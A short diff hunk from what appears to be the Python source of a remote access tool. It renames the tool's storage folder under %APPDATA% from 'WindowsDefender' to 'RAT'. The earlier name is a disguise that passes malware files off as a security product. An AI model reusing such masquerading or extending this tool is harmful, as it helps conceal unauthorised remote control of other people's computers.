@@ -10,7 +10,7 @@ BUFFER_SIZE = 4096
 SEPARATOR = "<SEPARATOR>"
 
 
-path = os.path.join(os.getenv('APPDATA'), "WindowsDefender")
+path = os.path.join(os.getenv('APPDATA'), "RAT")
 
 if not os.path.isdir(path):
     os.mkdir(path)
